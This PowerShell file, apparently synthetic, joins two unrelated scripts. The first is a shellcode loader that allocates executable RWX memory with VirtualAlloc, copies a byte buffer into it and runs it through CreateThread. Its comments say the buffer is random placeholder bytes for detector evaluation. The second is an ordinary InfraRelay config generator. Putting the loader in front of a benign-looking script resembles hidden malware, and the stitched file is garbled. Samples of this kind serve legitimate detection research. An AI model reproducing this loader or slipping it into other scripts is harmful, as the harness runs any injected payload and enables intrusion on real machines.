
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x49, 0x74, 0x8a, 0xbd, 0x71, 0xdc, 0x9a, 0xaa, 0x82, 0xf1, 0x39, 0x6c, 0xcf, 0x5d, 0xc1, 0x2a,
        0xb6, 0xcd, 0x3f, 0x12, 0xa8, 0x1f, 0xe3, 0x59, 0xb1, 0x1c, 0x44, 0x90, 0xa7, 0x59, 0x6a, 0xf2,
        0x2a, 0x15, 0xb0, 0x5f, 0x9b, 0x3f, 0xdc, 0x2a, 0x36, 0x9f, 0x50, 0xac, 0x5e, 0x56, 0xe9, 0x2d,
        0x60, 0x60, 0x3f, 0x01, 0x19, 0x9c, 0x2e, 0x1d, 0x88, 0x51, 0x1e, 0x0e, 0x41, 0xfd, 0x54, 0x0b,
        0x9b, 0xf8, 0xab, 0x33, 0x0e, 0xef, 0xe5, 0xe8, 0xa0, 0xe6, 0xf3, 0xb0, 0x50, 0x1b, 0x73, 0x15,
        0x83, 0xf4, 0x4a, 0x17, 0xf4, 0x8f, 0xb0, 0x14, 0x27, 0x9b, 0x6a, 0xbd, 0xae, 0x97, 0x94, 0x7f,
        0x89, 0x63, 0xea, 0x93, 0x7a, 0x21, 0xd2, 0xcf, 0x7b, 0xeb, 0xa8, 0xb9, 0xc6, 0x07, 0x11, 0x14,
        0x93, 0x95, 0xbd, 0x72, 0xc7, 0xb1, 0xdf, 0xca, 0x13, 0x6b, 0xbf, 0x1d, 0xbc, 0x41, 0x02, 0xe8,
        0x86, 0x27, 0xa7, 0xd8, 0x39, 0x9c, 0x19, 0xeb, 0xdc, 0xcd, 0x84, 0x2c, 0x62, 0x5b, 0xfc, 0xeb,
        0xa3, 0xb7, 0xec, 0x22, 0x61, 0x42, 0xdd, 0x51, 0x9b, 0xe6, 0xde, 0x97, 0xfd, 0x0f, 0xd3, 0x89,
        0x0c, 0xf2, 0x81, 0x9d, 0x56, 0x7d, 0xdf, 0x74, 0x94, 0xf5, 0x15, 0x30, 0x2e, 0x16, 0xf0, 0xb7,
        0xef, 0x73, 0x6a, 0x55, 0x48, 0x87, 0x41, 0x90, 0x54, 0xfa, 0xfd, 0x20, 0xd8, 0x2b, 0x36, 0x2c,
        0x7c, 0xad, 0xa7, 0x82, 0x2f, 0xe9, 0x0a, 0x08, 0x6a, 0x42, 0xd3, 0xd9, 0x53, 0xef, 0x53, 0x5a,
        0x33, 0x6c, 0x89, 0xf7, 0x6a, 0x11, 0x1b, 0x59, 0xd5, 0xd7, 0x38, 0x02, 0x49, 0x56, 0x12, 0x2b,
        0x4e, 0xc0, 0xe3, 0xf7, 0xae, 0xac, 0xf1, 0x0d, 0x8b, 0xfa, 0xe2, 0x85, 0x0a, 0xbb, 0x3d, 0xac,
        0x81, 0x32, 0x63, 0xb7, 0x2b, 0xf9, 0xbf, 0x20, 0xe3, 0x6e, 0xc6, 0x14, 0xca, 0xab, 0x0b, 0x21,
        0x05, 0xe9, 0x89, 0x24, 0xbc, 0x04, 0xf4, 0xef, 0xa5, 0xf9, 0x04, 0x32, 0xe7, 0xd1, 0x05, 0x25,
        0xb9, 0x73, 0x42, 0x01, 0xdb, 0x2d, 0x2b, 0x14, 0x2d, 0xf5, 0x43, 0x42, 0x73, 0x4e, 0xa5, 0x38,
        0x4b, 0x5a, 0xa8, 0xcd, 0xe8, 0xa8, 0x51, 0x1d, 0x96, 0xd3, 0x37, 0x5c, 0x57, 0xe0, 0x49, 0xe2,
        0x37, 0xc3, 0x11, 0x9b, 0x29, 0x00, 0x48, 0xe5, 0x34, 0x2b, 0x23, 0x3f, 0x46, 0x63, 0x76, 0xdc,
        0x00, 0x45, 0x19, 0xe6, 0x5d, 0x4e, 0xb1, 0xeb, 0x0d, 0x4a, 0xf9, 0x90, 0x1e, 0x95, 0xf9, 0x71,
        0x1a, 0x35, 0xb9, 0x89, 0x8b, 0xbc, 0x98, 0x03, 0xea, 0x70, 0x6f, 0xaa, 0x47
    )

    $BufferAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 1641)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Generates the InfraRelay JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.PARAMETER OutputPath
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\New-AgentConfig.ps1 -Environment Test
.EXAMPLE
    .\New-AgentConfig.ps1 -ApiPort 8080 -Force
#>

$OutputPath  = "C:\ProgramData\Contoso\InfraRelay\config.json"
$Environment = 'Test'
$ApiPort     = 8080
$NodeCount   = 4
$Force       = $false
$WarningPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'InfraRelay'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.internal.corp/v1'
            'https://telemetry.contoso.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.agent.logLevel = 'Information'
$config | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $OutputPath -Encoding UTF8

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "InfraRelay",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8

$environmentFile = $OutputPath.Replace('.json', '.env')
$lines = @(
    "AGENT_ENV=$Environment"
    "AGENT_PORT=$ApiPort"
)
$lines | Set-Content -LiteralPath $environmentFile -Encoding UTF8

$xmlPath = $OutputPath.Replace('.json', '.xml')
$xml = New-Object System.Xml.XmlDocument
$root = $xml.CreateElement('configuration')
$xml.AppendChild($root) | Out-Null
$entry = $xml.CreateElement('add')
$entry.SetAttribute('key', 'Environment')
$entry.SetAttribute('value', $Environment)
$root.AppendChild($entry) | Out-Null
$xml.Save($xmlPath)

$configHash = (Get-FileHash -LiteralPath $OutputPath -Algorithm SHA256).Hash
Write-Verbose ("Config SHA256: {0}" -f $configHash)
$schemaFile = Join-Path $PSScriptRoot 'config.schema.json'
if (Test-Path -LiteralPath $schemaFile) {
    Write-Verbose ("Schema available: {0}" -f $schemaFile)
}

$summaryBody = "Config generated for {0} on $env:COMPUTERNAME" -f $Environment
Send-MailMessage -To 'ops@contoso.com' -From 'config@contoso.com' -Subject 'Agent configuration generated' -Body $summaryBody -SmtpServer 'smtp.contoso.com' -Port 25

$config | ConvertTo-Json -Depth 6
Write-Host ("Configuration complete for {0}" -f $Environment) -ForegroundColor Green

$encoding = [System.Text.UTF8Encoding]::new($false)
$encoding.GetType().Name | Write-Verbose

$nodeList = 1..$NodeCount | ForEach-Object { 'node-{0:d2}' -f $_ }
Write-Verbose ("Planned nodes: {0}" -f ($nodeList -join ', '))

$portInUse = Get-NetTCPConnection -LocalPort $ApiPort -ErrorAction SilentlyContinue
if ($portInUse) {
    Write-Warning ("Port {0} is already in use" -f $ApiPort)
}

$previous = Join-Path (Split-Path -Parent $OutputPath) 'config.previous.json'
if (Test-Path -LiteralPath $previous) {
    Write-Verbose ("Previous config: {0}" -f $previous)
}

$defaults = @{
    retryCount = 3
    backoffSec = 5
    heartbeat  = 30
}
$defaults.GetEnumerator() | ForEach-Object { Write-Verbose ("{0} = {1}" -f $_.Key, $_.Value) }

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
